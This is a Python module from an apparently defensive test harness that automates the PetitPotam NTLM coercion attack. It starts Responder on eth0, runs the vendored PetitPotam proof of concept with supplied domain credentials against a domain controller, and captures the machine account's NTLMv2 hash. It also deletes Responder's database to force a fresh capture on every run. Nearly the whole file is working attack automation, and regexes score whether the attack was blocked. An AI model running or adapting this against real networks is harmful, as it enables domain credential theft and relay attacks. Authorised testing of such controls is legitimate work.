"""PetitPotam (MS-EFSRPC) NTLM coercion. Coerces the DC's machine account to
authenticate back to this Kali host over SMB, captured by Responder — the
same two-process chain as the manual test (Responder listening, PetitPotam
triggering the callback). Requires root (Responder binds privileged ports
and does raw poisoning) — run the harness itself with sudo for this one.

PetitPotam.py is vendored under modules/_vendor/ (source:
https://github.com/topotam/PetitPotam, PoC by @topotam77) so this module
has no runtime internet dependency.
"""
import os
import shutil
import socket
import subprocess
import time

IFACE = "eth0"
CAPTURE_WAIT = 6   # seconds to let the coerced auth land on Responder after triggering
VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor")
PETITPOTAM = os.path.join(VENDOR_DIR, "PetitPotam.py")
# Responder dedupes against creds already on file here and prints "Skipping
# previously captured hash" instead of the hash — deleting it before each
# run forces a fresh capture every time (Responder recreates it automatically
# if missing, only if not os.path.exists(...) — see utils.py:CreateResponderDb).
RESPONDER_DB = "/usr/share/responder/Responder.db"

META = {
    "id": "petitpotam",
    "name": "PetitPotam NTLM Coercion",
    "category": "AD Exploitation",
    "control": "SMB signing / NTLM relay & outbound-auth protections",
    "fix": "Server",
    "requires": ["responder", "python3"],
    "needs_root": True,            # Responder binds privileged ports + raw poisoning
    "os_supported": ["Linux"],     # Responder + eth0 raw poisoning are Linux-only
    "requires_files": [PETITPOTAM],  # vendored PoC under modules/_vendor/
    "ports": [("tcp", 445)],       # MS-EFSRPC coercion over SMB
    # a captured hash is the real finding; PetitPotam's own "Attack worked!"
    # only means the RPC coercion call landed, not that anything caught it.
    # "Skipping previously captured hash" also counts — Responder dedupes
    # against creds it already has on file, so a repeat run (e.g. the
    # harness's own 3-iteration mode) genuinely re-triggers the coercion but
    # won't reprint the hash; the DC still authenticated to us either way.
    # deliberately does NOT match RESPONDER-PRIV-ERROR — that means the
    # attack never ran at all (no root), which must NOT read as "blocked".
    "success_regex": r"NTLMv2-SSP Hash|Skipping previously captured hash",
    "blocked_regex": r"could not connect|timed out|Connection refused|RPC_S_ACCESS_DENIED",
}


def _local_ip(target):
    # UDP connect() just sets the default peer (no packets, no handshake), so it
    # won't block — but set a timeout anyway and fall back rather than raise.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(3)
        s.connect((target, 80))
        return s.getsockname()[0]
    except OSError:
        return "0.0.0.0"
    finally:
        s.close()


def run(target, ctx):
    out = [f"# PetitPotam coercion vs {target} -> callback to this host ({IFACE})"]

    if not os.path.exists(PETITPOTAM):
        return "[ERROR] PetitPotam.py not found under modules/_vendor/."
    if shutil.which("responder") is None:
        return "[ERROR] responder not installed (sudo apt install responder)."

    try:
        os.remove(RESPONDER_DB)
        out.append(f"(cleared {RESPONDER_DB} — forcing a fresh capture, not a dedup skip)")
    except FileNotFoundError:
        pass
    except PermissionError:
        out.append(f"[WARN] could not clear {RESPONDER_DB} (not root?) — a "
                    "previously-seen hash may still show as a dedup skip.")

    # PYTHONUNBUFFERED — without it, Responder (a Python tool) block-buffers
    # its stdout once it's not attached to a real TTY (i.e. always, when
    # piped from here), so output only appears once the internal buffer
    # fills or the process exits cleanly — terminate() can lose it entirely.
    resp_env = {**os.environ, "PYTHONUNBUFFERED": "1"}
    responder = subprocess.Popen(
        ["responder", "-I", IFACE],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        env=resp_env)

    time.sleep(2)  # let Responder finish binding its listeners before triggering
    if responder.poll() is not None:
        # exited already (almost always: not running as root)
        early_out, _ = responder.communicate()
        out.append("## Responder\n" + (early_out or ""))
        if "must be run as root" in (early_out or ""):
            out.append(
                "RESPONDER-PRIV-ERROR: Responder needs root (privileged port "
                "binds + raw poisoning). Run the harness itself with sudo for "
                "this attack — the target was never actually coerced.")
        else:
            out.append("RESPONDER-PRIV-ERROR: Responder exited before the trigger ran.")
        return "\n".join(out)

    listener_ip = _local_ip(target)
    creds = ctx.creds
    try:
        pp = subprocess.run(
            ["python3", PETITPOTAM,
             "-d", creds.get("domain", ""),
             "-u", creds.get("dc_user", ""),
             "-p", creds.get("dc_pass", ""),
             listener_ip, target],
            capture_output=True, text=True, timeout=30)
        out.append("## PetitPotam\n" + pp.stdout + pp.stderr)
    except subprocess.TimeoutExpired:
        out.append("## PetitPotam\n[TIMEOUT] PetitPotam did not finish in time")

    time.sleep(CAPTURE_WAIT)  # let the coerced callback land on Responder

    responder.terminate()
    try:
        resp_out, _ = responder.communicate(timeout=5)
    except Exception:
        responder.kill()
        resp_out, _ = responder.communicate()

    out.append("## Responder\n" + (resp_out or "(no output)"))
    return "\n".join(out)
